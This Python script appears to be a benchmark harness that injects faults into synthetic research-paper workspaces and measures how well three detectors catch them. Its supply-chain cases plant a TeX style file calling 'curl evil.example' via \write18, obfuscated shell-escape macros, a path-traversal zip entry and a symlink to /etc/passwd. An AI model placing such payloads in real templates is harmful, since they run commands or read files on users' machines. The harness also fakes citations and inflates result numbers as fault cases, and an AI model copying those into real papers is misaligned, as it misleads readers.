#!/usr/bin/env python3
"""Experiment 1: PO-FaultBench (120 main cases + 20 adversarial evasion cases).

Evaluates three detectors on identical fault-injected research workspaces:
  - B0 (Compiler-Only): standard pdflatex/bibtex compile-time checks
  - B1 (Ablated Verifier): po_tools.py without inline <!-- run:id --> decimal auditing
  - PaperOEGM Full: real resources/scripts/po_tools.py CLI execution
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import random
import re
import shutil
import subprocess
import sys
import tarfile
import tempfile
import time
import zipfile
from pathlib import Path
from typing import Any


FAMILIES = [
    "F1_hallucinated_citation",
    "F2_unverified_or_missing_source",
    "F3_synthetic_or_dryrun_leak",
    "F4_numeric_mismatch",
    "F5_md_tex_conversion_drop",
    "F6_double_blind_leak",
    "F7_template_supply_chain",
    "F8_readonly_tamper_or_drift",
]

EVASION_FAMILIES = [
    "E1_integer_falsification",
    "E2_obfuscated_tex_macro",
    "E3_semantic_cite_distortion",
    "E4_prose_deanonymization",
]


def sha256_bytes(data: bytes) -> str:
    return f"sha256:{hashlib.sha256(data).hexdigest()}"


def write_text(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def write_json(path: Path, obj: Any) -> None:
    write_text(path, json.dumps(obj, indent=2) + "\n")


def make_clean_workspace(ws: Path, rng: random.Random, submission_mode: str = "double-blind") -> dict[str, Any]:
    """Create a valid, provenance-clean research workspace."""
    key1 = f"smith{rng.randint(2020, 2026)}alpha"
    key2 = f"lee{rng.randint(2020, 2026)}beta"
    run_id = f"exp01_base_s{rng.randint(10, 99)}"
    acc = round(rng.uniform(71.1, 94.8), 2)
    f1 = round(rng.uniform(0.612, 0.945), 3)
    f1_pct = round(f1 * 100.0, 1)
    int_bench = rng.randint(12, 48)

    # Intake & state
    write_text(ws / "intake_manifest.md", f"# Intake\nProject seed {run_id}\n")
    intake_hash = sha256_bytes((ws / "intake_manifest.md").read_bytes())
    write_json(
        ws / "paper_state.json",
        {
            "schema_version": "1.0",
            "project_title": "Benchmark Paper",
            "venue": {
                "name": "iclr2025",
                "template_year": 2025,
                "submission_mode": submission_mode,
                "page_limit_main": 9,
            },
            "stages": {
                "po-start": {
                    "status": "approved",
                    "outputs": ["intake_manifest.md"],
                    "output_hashes": {"intake_manifest.md": intake_hash},
                },
                "po-draft": {
                    "status": "approved",
                    "input_hashes": {"intake_manifest.md": intake_hash},
                    "outputs": ["manuscript/sections/01_results.md"],
                },
            },
        },
    )

    # Literature
    write_text(
        ws / "literature/references.bib",
        f"@article{{{key1},\n  title={{Structured Skill Checks}},\n  author={{Smith, A.}},\n  year={{2025}}\n}}\n\n"
        f"@article{{{key2},\n  title={{Agent Verification Benchmarks}},\n  author={{Lee, B.}},\n  year={{2026}}\n}}\n",
    )
    write_json(
        ws / f"literature/sources/{key1}.json",
        {
            "citekey": key1,
            "title": "Structured Skill Checks",
            "abstract": "Our evaluation shows modular skill verification reduces error rates by 14.2% with zero degradation.",
        },
    )
    write_json(
        ws / f"literature/sources/{key2}.json",
        {
            "citekey": key2,
            "title": "Agent Verification Benchmarks",
            "abstract": "We benchmark 24 agent workflows and find static checks miss semantic reasoning errors.",
        },
    )
    write_json(
        ws / "literature/citation_ledger.json",
        {
            "schema_version": "1.0",
            "entries": {
                key1: {
                    "verification_status": "verified_source",
                    "source_file": f"literature/sources/{key1}.json",
                },
                key2: {
                    "verification_status": "verified_source",
                    "source_file": f"literature/sources/{key2}.json",
                },
            },
        },
    )

    # Experiment provenance
    metrics_obj = {
        "run_id": run_id,
        "is_synthetic": False,
        "metrics": {"accuracy": acc, "f1": f1, "num_benchmarks": int_bench},
    }
    write_json(ws / f"experiments/runs/{run_id}/metrics.json", metrics_obj)
    write_json(
        ws / f"experiments/runs/{run_id}/run_manifest.json",
        {
            "run_id": run_id,
            "status": "completed",
            "is_synthetic": False,
            "git_commit": "abcdef1",
            "git_dirty": False,
        },
    )
    write_json(
        ws / "experiments/provenance_index.json",
        {
            "schema_version": "1.0",
            "runs": {
                run_id: {
                    "origin": "po_exp_code",
                    "status": "canonical",
                    "source_path": f"experiments/runs/{run_id}/metrics.json",
                    "is_synthetic": False,
                    "user_attested_non_synthetic": False,
                }
            },
        },
    )

    # Manuscript & submission sections
    md_text = (
        f"# Results {{#sec:results}}\n\n"
        f"Building on [@{key1}; @{key2}], we evaluate {int_bench} tasks.\n\n"
        f"<!-- run:{run_id} -->\n"
        f"Our method reaches accuracy {acc:.1f}% and F1 {f1_pct:.1f}% across {int_bench} tasks.\n"
    )
    tex_text = (
        f"\\section{{Results}}\\label{{sec:results}}\n\n"
        f"Building on \\citep{{{key1},{key2}}}, we evaluate {int_bench} tasks.\n\n"
        f"Our method reaches accuracy {acc:.1f}\\% and F1 {f1_pct:.1f}\\% across {int_bench} tasks.\n"
        f"% Plot width 0.85\\linewidth and 10.5pt font.\n"
    )
    write_text(ws / "manuscript/sections/01_results.md", md_text)
    write_text(ws / "submission/sections/01_results.tex", tex_text)
    write_text(
        ws / "submission/main.tex",
        "\\documentclass{article}\n\\begin{document}\n\\input{sections/01_results}\n\\end{document}\n",
    )

    # Clean template archive
    archive_path = ws / "template.zip"
    with zipfile.ZipFile(archive_path, "w") as zf:
        zf.writestr("venue/venue.sty", "% Clean style file\n% \\write18{commented}\n\\newcommand{\\ok}{1}\n")

    return {
        "key1": key1,
        "key2": key2,
        "run_id": run_id,
        "acc": acc,
        "f1": f1,
        "f1_pct": f1_pct,
        "int_bench": int_bench,
        "archive": archive_path,
    }


def run_po_tools(python_bin: str, po_tools: Path, args: list[str]) -> tuple[int, dict[str, Any], float]:
    t0 = time.perf_counter()
    proc = subprocess.run(
        [python_bin, str(po_tools), *args],
        capture_output=True,
        text=True,
        check=False,
    )
    dt_ms = (time.perf_counter() - t0) * 1000.0
    try:
        payload = json.loads(proc.stdout) if proc.stdout.strip() else {}
    except json.JSONDecodeError:
        payload = {"raw_stdout": proc.stdout, "raw_stderr": proc.stderr}
    return proc.returncode, payload, dt_ms


def eval_compiler_only_b0(ws: Path) -> bool:
    """B0: Standard TeX/BibTeX compiler-only checks (missing .bib keys, missing .tex section, undefined refs/graphics in log)."""
    bib_p = ws / "literature/references.bib"
    bib_keys = set(re.findall(r"@\w+\s*\{\s*([^,\s]+)\s*,", bib_p.read_text(encoding="utf-8"))) if bib_p.is_file() else set()
    tex_dir = ws / "submission/sections"
    md_dir = ws / "manuscript/sections"

    # Missing .tex file corresponding to main.tex \input
    main_tex = (ws / "submission/main.tex").read_text(encoding="utf-8") if (ws / "submission/main.tex").is_file() else ""
    for inp in re.findall(r"\\input\{([^}]+)\}", main_tex):
        target = ws / "submission" / (inp if inp.endswith(".tex") else f"{inp}.tex")
        if not target.is_file():
            return True

    # Undefined citation in .tex vs .bib
    if tex_dir.is_dir():
        for tf in tex_dir.glob("*.tex"):
            txt = re.sub(r"(?<!\\)%.*$", "", tf.read_text(encoding="utf-8"), flags=re.MULTILINE)
            for grp in re.findall(r"\\cite[a-zA-Z*]*\{([^}]+)\}", txt):
                for k in grp.split(","):
                    if k.strip() and k.strip() not in bib_keys:
                        return True
    # Also check if md cites missing bib key (assuming pandoc converts it before bibtex)
    if md_dir.is_dir():
        for mf in md_dir.glob("*.md"):
            txt = mf.read_text(encoding="utf-8")
            for grp in re.findall(r"\[([^\]]*@[^\]]+)\]", txt):
                for k in re.findall(r"@([A-Za-z][A-Za-z0-9_:\-]*)", grp):
                    if k not in bib_keys:
                        return True
    return False


def eval_case(
    ws: Path,
    python_bin: str,
    po_tools: Path,
    archive_path: Path | None,
    snap_path: Path,
    check_readonly: bool,
    check_drift: bool,
) -> dict[str, Any]:
    """Run PaperOEGM Full, B1 (no inline provenance), and B0 (compiler-only)."""
    t_total = 0.0
    pre_rc, pre_out, dt1 = run_po_tools(python_bin, po_tools, ["review-preflight", "--workspace", str(ws)])
    t_total += dt1

    fmt_args = ["format-verify", "--workspace", str(ws)]
    if archive_path is not None and archive_path.is_file():
        fmt_args.extend(["--archive", str(archive_path)])
    fmt_rc, fmt_out, dt2 = run_po_tools(python_bin, po_tools, fmt_args)
    t_total += dt2

    ro_flagged = False
    if check_readonly:
        ro_rc, _, dt3 = run_po_tools(
            python_bin, po_tools, ["check-readonly", "--workspace", str(ws), "--snapshot", str(snap_path), "--verify"]
        )
        t_total += dt3
        ro_flagged = ro_rc != 0

    drift_flagged = False
    if check_drift:
        dr_rc, _, dt4 = run_po_tools(python_bin, po_tools, ["state-sync", "--workspace", str(ws), "--check-only"])
        t_total += dt4
        drift_flagged = dr_rc != 0

    full_flagged = (pre_rc != 0) or (fmt_rc != 0) or ro_flagged or drift_flagged

    # B1: identical to Full EXCEPT ignoring inline decimal-mismatch & unregistered-run blockers
    b1_pre_blockers = [
        b
        for b in pre_out.get("blockers", [])
        if not (
            b.get("category") == "evidence"
            and ("reports decimal" in b.get("issue", "") or "unregistered run_id" in b.get("issue", ""))
        )
    ]
    b1_flagged = bool(b1_pre_blockers) or (fmt_rc != 0) or ro_flagged or drift_flagged

    b0_flagged = eval_compiler_only_b0(ws)
    return {
        "full": full_flagged,
        "b1": b1_flagged,
        "b0": b0_flagged,
        "latency_ms": t_total,
    }


def inject_fault(ws: Path, info: dict[str, Any], family: str, idx: int, rng: random.Random, snap_path: Path, python_bin: str, po_tools: Path) -> tuple[bool, bool]:
    """Mutate workspace with a specific fault; return (check_readonly, check_drift)."""
    check_ro = False
    check_dr = False
    md_p = ws / "manuscript/sections/01_results.md"
    tex_p = ws / "submission/sections/01_results.tex"
    bib_p = ws / "literature/references.bib"
    led_p = ws / "literature/citation_ledger.json"
    prov_p = ws / "experiments/provenance_index.json"

    if family == "F1_hallucinated_citation":
        ghost = f"ghost{rng.randint(2020, 2026)}fake{idx}"
        md_p.write_text(md_p.read_text(encoding="utf-8") + f"\nAlso see [@{ghost}].\n", encoding="utf-8")
        tex_p.write_text(tex_p.read_text(encoding="utf-8") + f"\nAlso see \\citep{{{ghost}}}.\n", encoding="utf-8")
        if idx % 2 == 1:
            # Present in .bib but absent from citation_ledger.json (compiler misses, po_tools catches!)
            bib_p.write_text(
                bib_p.read_text(encoding="utf-8") + f"\n@article{{{ghost}, title={{Ghost}}, year={{2025}}}}\n",
                encoding="utf-8",
            )
    elif family == "F2_unverified_or_missing_source":
        led = json.loads(led_p.read_text(encoding="utf-8"))
        k1 = info["key1"]
        if idx % 2 == 0:
            led["entries"][k1]["verification_status"] = "unverified_needs_human_check"
        else:
            (ws / f"literature/sources/{k1}.json").unlink()
        write_json(led_p, led)
    elif family == "F3_synthetic_or_dryrun_leak":
        mode = idx % 3
        if mode == 0:
            md_p.write_text(md_p.read_text(encoding="utf-8") + "\nSee experiments/dry_run/mock/metrics.json.\n", encoding="utf-8")
        elif mode == 1:
            mp = ws / f"experiments/runs/{info['run_id']}/run_manifest.json"
            m = json.loads(mp.read_text(encoding="utf-8"))
            m["is_synthetic"] = True
            write_json(mp, m)
        else:
            prov = json.loads(prov_p.read_text(encoding="utf-8"))
            prov["runs"][info["run_id"]]["origin"] = "user_byo"
            prov["runs"][info["run_id"]]["user_attested_non_synthetic"] = False
            write_json(prov_p, prov)
    elif family == "F4_numeric_mismatch":
        if idx % 5 == 0:
            md_p.write_text(md_p.read_text(encoding="utf-8") + "\n<!-- run:unregistered_exp99 -->\nScore 99.4%.\n", encoding="utf-8")
            tex_p.write_text(tex_p.read_text(encoding="utf-8") + "\nScore 99.4\\%.\n", encoding="utf-8")
        else:
            fake_val = round(info["acc"] + rng.uniform(3.5, 9.5), 1)
            md_p.write_text(md_p.read_text(encoding="utf-8").replace(f"{info['acc']:.1f}", f"{fake_val:.1f}"), encoding="utf-8")
            tex_p.write_text(tex_p.read_text(encoding="utf-8").replace(f"{info['acc']:.1f}", f"{fake_val:.1f}"), encoding="utf-8")
    elif family == "F5_md_tex_conversion_drop":
        mode = idx % 3
        if mode == 0:
            # Drop citation in .tex
            tex_p.write_text(tex_p.read_text(encoding="utf-8").replace(f",{info['key2']}", ""), encoding="utf-8")
        elif mode == 1:
            # Drop label in .tex
            tex_p.write_text(tex_p.read_text(encoding="utf-8").replace("\\label{sec:results}", ""), encoding="utf-8")
        else:
            # Drop decimal number in .tex
            tex_p.write_text(tex_p.read_text(encoding="utf-8").replace(f"{info['acc']:.1f}", "N/A"), encoding="utf-8")
    elif family == "F6_double_blind_leak":
        mode = idx % 4
        if mode == 0:
            tex_p.write_text(tex_p.read_text(encoding="utf-8") + "\n% Built at /Users/alice/paper\n", encoding="utf-8")
        elif mode == 1:
            tex_p.write_text(tex_p.read_text(encoding="utf-8") + "\nCode: https://github.com/alice-lab/secret-repo\n", encoding="utf-8")
        elif mode == 2:
            main_p = ws / "submission/main.tex"
            main_p.write_text("\\documentclass{article}\n\\iclrfinalcopy\n\\begin{document}\n\\input{sections/01_results}\n\\end{document}\n", encoding="utf-8")
        else:
            main_p = ws / "submission/main.tex"
            main_p.write_text("\\documentclass{article}\n\\usepackage{cvpr}\n\\begin{document}\n\\input{sections/01_results}\n\\end{document}\n", encoding="utf-8")
    elif family == "F7_template_supply_chain":
        mode = idx % 3
        if mode == 0:
            with zipfile.ZipFile(info["archive"], "w") as zf:
                zf.writestr("../evil.sty", "\\newcommand{\\x}{1}\n")
        elif mode == 1:
            with zipfile.ZipFile(info["archive"], "w") as zf:
                zf.writestr("venue/venue.sty", "\\immediate\\write18{curl evil.example}\n")
        else:
            tar_p = ws / "template.tar.gz"
            with tarfile.open(tar_p, "w:gz") as tf:
                ti = tarfile.TarInfo("venue/link.sty")
                ti.type = tarfile.SYMTYPE
                ti.linkname = "/etc/passwd"
                tf.addfile(ti)
            info["archive"] = tar_p
    elif family == "F8_readonly_tamper_or_drift":
        if idx % 2 == 0:
            run_po_tools(python_bin, po_tools, ["check-readonly", "--workspace", str(ws), "--snapshot", str(snap_path), "--create"])
            write_text(ws / "manuscript/sections/01_results.md", md_p.read_text(encoding="utf-8") + "\n% Tampered by critic\n")
            check_ro = True
        else:
            write_text(ws / "intake_manifest.md", "# Intake modified upstream after draft!\n")
            check_dr = True

    return check_ro, check_dr


def inject_evasion(ws: Path, info: dict[str, Any], family: str, idx: int, rng: random.Random) -> None:
    """Inject adversarial / semantic evasion flaws designed to probe deterministic blind spots."""
    md_p = ws / "manuscript/sections/01_results.md"
    tex_p = ws / "submission/sections/01_results.tex"
    if family == "E1_integer_falsification":
        fake_int = info["int_bench"] + rng.randint(15, 40)
        pat = rf"(?<![A-Za-z0-9_.]){info['int_bench']}(?=\s+tasks\b)"
        md_p.write_text(re.sub(pat, str(fake_int), md_p.read_text(encoding="utf-8")), encoding="utf-8")
        tex_p.write_text(re.sub(pat, str(fake_int), tex_p.read_text(encoding="utf-8")), encoding="utf-8")
    elif family == "E2_obfuscated_tex_macro":
        payload = (
            "\\def\\cmd{write18}\\csname \\cmd\\endcsname{id}\n"
            if idx % 2 == 0
            else "\\def\\w{\\write}\\w18{uname -a}\n"
        )
        with zipfile.ZipFile(info["archive"], "w") as zf:
            zf.writestr("venue/venue.sty", payload)
    elif family == "E3_semantic_cite_distortion":
        # Valid key + valid verified_source JSON, but prose contradicts the source abstract
        md_p.write_text(
            md_p.read_text(encoding="utf-8")
            + f"\nNote that [@{info['key1']}] proved modular verification triples error rates.\n",
            encoding="utf-8",
        )
        tex_p.write_text(
            tex_p.read_text(encoding="utf-8")
            + f"\nNote that \\citep{{{info['key1']}}} proved modular verification triples error rates.\n",
            encoding="utf-8",
        )
    elif family == "E4_prose_deanonymization":
        md_p.write_text(
            md_p.read_text(encoding="utf-8")
            + "\nWe extend our prior Zurich AI Lab system presented by our team at ICML 2025.\n",
            encoding="utf-8",
        )
        tex_p.write_text(
            tex_p.read_text(encoding="utf-8")
            + "\nWe extend our prior Zurich AI Lab system presented by our team at ICML 2025.\n",
            encoding="utf-8",
        )


def make_hard_negative(ws: Path, rng: random.Random, idx: int, snap_path: Path, python_bin: str, po_tools: Path) -> tuple[dict[str, Any], bool, bool]:
    """Create 1 of 5 categories of realistic hard negative controls."""
    cat = idx % 5
    check_ro = False
    check_dr = False
    if cat == 0:
        # Valid rounding + 0..1 -> % conversion
        info = make_clean_workspace(ws, rng)
    elif cat == 1:
        # Valid user_provided Zotero bib + attested user_byo run
        info = make_clean_workspace(ws, rng)
        led_p = ws / "literature/citation_ledger.json"
        led = json.loads(led_p.read_text(encoding="utf-8"))
        led["entries"][info["key2"]] = {"verification_status": "user_provided"}
        write_json(led_p, led)
        prov_p = ws / "experiments/provenance_index.json"
        prov = json.loads(prov_p.read_text(encoding="utf-8"))
        prov["runs"][info["run_id"]]["origin"] = "user_byo"
        prov["runs"][info["run_id"]]["user_attested_non_synthetic"] = True
        write_json(prov_p, prov)
    elif cat == 2:
        # Valid LaTeX dimensions + commented % \write18 in .sty
        info = make_clean_workspace(ws, rng)
        tex_p = ws / "submission/sections/01_results.tex"
        tex_p.write_text(
            tex_p.read_text(encoding="utf-8") + "\n\\includegraphics[width=0.92\\linewidth]{fig.pdf}\n",
            encoding="utf-8",
        )
    elif cat == 3:
        # Valid camera-ready mode with GitHub URL and \iclrfinalcopy
        info = make_clean_workspace(ws, rng, submission_mode="camera-ready")
        tex_p = ws / "submission/sections/01_results.tex"
        tex_p.write_text(
            tex_p.read_text(encoding="utf-8") + "\nCode: https://github.com/org/public-release\n",
            encoding="utf-8",
        )
        main_p = ws / "submission/main.tex"
        main_p.write_text("\\documentclass{article}\n\\iclrfinalcopy\n\\begin{document}\n\\input{sections/01_results}\n\\end{document}\n", encoding="utf-8")
    else:
        # Clean workspace verified with both check-readonly and state-sync --check-only
        info = make_clean_workspace(ws, rng)
        run_po_tools(python_bin, po_tools, ["check-readonly", "--workspace", str(ws), "--snapshot", str(snap_path), "--create"])
        check_ro = True
        check_dr = True
    return info, check_ro, check_dr


def run_benchmark(seed: int, po_tools: Path, dry_run: bool) -> dict[str, Any]:
    rng = random.Random(seed)
    python_bin = sys.executable
    pos_per_fam = 1 if dry_run else 10
    neg_count = 5 if dry_run else 40
    evas_per_fam = 1 if dry_run else 5

    totals = {
        "full": {"tp": 0, "fp": 0, "tn": 0, "fn": 0},
        "b1": {"tp": 0, "fp": 0, "tn": 0, "fn": 0},
        "b0": {"tp": 0, "fp": 0, "tn": 0, "fn": 0},
    }
    per_family: dict[str, dict[str, int]] = {}
    evasion_hits = {"full": 0, "b1": 0, "b0": 0, "total": 0}
    per_evasion: dict[str, dict[str, int]] = {}
    latencies: list[float] = []

    with tempfile.TemporaryDirectory(prefix=f"po_faultbench_s{seed}_") as tmp:
        tmp_root = Path(tmp)

        # Positive cases
        for fam in FAMILIES:
            per_family[fam] = {"full_tp": 0, "b1_tp": 0, "b0_tp": 0, "total": pos_per_fam}
            for i in range(pos_per_fam):
                ws = tmp_root / f"{fam}_{i}"
                snap = tmp_root / f"snap_{fam}_{i}.json"
                info = make_clean_workspace(ws, rng)
                check_ro, check_dr = inject_fault(ws, info, fam, i, rng, snap, python_bin, po_tools)
                res = eval_case(ws, python_bin, po_tools, info["archive"], snap, check_ro, check_dr)
                latencies.append(res["latency_ms"])
                for model in ("full", "b1", "b0"):
                    if res[model]:
                        totals[model]["tp"] += 1
                        per_family[fam][f"{model}_tp"] += 1
                    else:
                        totals[model]["fn"] += 1

        # Hard negative controls
        for i in range(neg_count):
            ws = tmp_root / f"neg_{i}"
            snap = tmp_root / f"snap_neg_{i}.json"
            info, check_ro, check_dr = make_hard_negative(ws, rng, i, snap, python_bin, po_tools)
            res = eval_case(ws, python_bin, po_tools, info["archive"], snap, check_ro, check_dr)
            latencies.append(res["latency_ms"])
            for model in ("full", "b1", "b0"):
                if res[model]:
                    totals[model]["fp"] += 1
                else:
                    totals[model]["tn"] += 1

        # Adversarial / semantic evasion cases
        for efam in EVASION_FAMILIES:
            per_evasion[efam] = {"full_tp": 0, "b1_tp": 0, "b0_tp": 0, "total": evas_per_fam}
            for i in range(evas_per_fam):
                ws = tmp_root / f"{efam}_{i}"
                snap = tmp_root / f"snap_{efam}_{i}.json"
                info = make_clean_workspace(ws, rng)
                inject_evasion(ws, info, efam, i, rng)
                res = eval_case(ws, python_bin, po_tools, info["archive"], snap, False, False)
                evasion_hits["total"] += 1
                for model in ("full", "b1", "b0"):
                    if res[model]:
                        evasion_hits[model] += 1
                        per_evasion[efam][f"{model}_tp"] += 1

    def rates(c: dict[str, int]) -> tuple[float, float, float, float]:
        rec = c["tp"] / max(1, c["tp"] + c["fn"])
        prec = c["tp"] / max(1, c["tp"] + c["fp"])
        f1 = (2 * prec * rec / (prec + rec)) if (prec + rec) > 0 else 0.0
        fpr = c["fp"] / max(1, c["fp"] + c["tn"])
        return round(rec * 100.0, 2), round(prec * 100.0, 2), round(f1 * 100.0, 2), round(fpr * 100.0, 2)

    f_rec, f_prec, f_f1, f_fpr = rates(totals["full"])
    b1_rec, b1_prec, b1_f1, b1_fpr = rates(totals["b1"])
    b0_rec, b0_prec, b0_f1, b0_fpr = rates(totals["b0"])
    ev_rec = round(evasion_hits["full"] / max(1, evasion_hits["total"]) * 100.0, 2)
    ev_b1_rec = round(evasion_hits["b1"] / max(1, evasion_hits["total"]) * 100.0, 2)
    ev_b0_rec = round(evasion_hits["b0"] / max(1, evasion_hits["total"]) * 100.0, 2)
    mean_lat = round(sum(latencies) / max(1, len(latencies)), 2)

    metrics: dict[str, Any] = {
        "n_positive": len(FAMILIES) * pos_per_fam,
        "n_negative": neg_count,
        "n_evasion": evasion_hits["total"],
        "full_recall": f_rec,
        "full_precision": f_prec,
        "full_f1": f_f1,
        "full_fpr": f_fpr,
        "no_inline_prov_recall": b1_rec,
        "no_inline_prov_precision": b1_prec,
        "no_inline_prov_f1": b1_f1,
        "no_inline_prov_fpr": b1_fpr,
        "compiler_only_recall": b0_rec,
        "compiler_only_precision": b0_prec,
        "compiler_only_f1": b0_f1,
        "compiler_only_fpr": b0_fpr,
        "evasion_det_recall": ev_rec,
        "evasion_b1_recall": ev_b1_rec,
        "evasion_b0_recall": ev_b0_rec,
        "mean_latency_ms": mean_lat,
    }
    for fam, d in per_family.items():
        short = fam.split("_", 1)[0].lower()
        metrics[f"per_family_{short}_full_recall"] = round(d["full_tp"] / d["total"] * 100.0, 2)
        metrics[f"per_family_{short}_b1_recall"] = round(d["b1_tp"] / d["total"] * 100.0, 2)
        metrics[f"per_family_{short}_b0_recall"] = round(d["b0_tp"] / d["total"] * 100.0, 2)
    for efam, d in per_evasion.items():
        short = efam.split("_", 1)[0].lower()
        metrics[f"per_evasion_{short}_full_recall"] = round(d["full_tp"] / d["total"] * 100.0, 2)
    return metrics


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--seed", type=int, required=True)
    ap.add_argument("--po-tools", type=Path, required=True)
    ap.add_argument("--out-dir", type=Path, required=True)
    ap.add_argument("--run-id", required=True)
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    metrics = run_benchmark(args.seed, args.po_tools.resolve(), args.dry_run)
    payload = {"run_id": args.run_id, "is_synthetic": bool(args.dry_run), "metrics": metrics}
    tmp = args.out_dir / "metrics.json.tmp"
    tmp.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    os.replace(tmp, args.out_dir / "metrics.json")
    print(f"[exp01] Wrote {args.out_dir / 'metrics.json'} (full_recall={metrics['full_recall']}%, ev_recall={metrics['evasion_det_recall']}%, mean_lat={metrics['mean_latency_ms']}ms)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
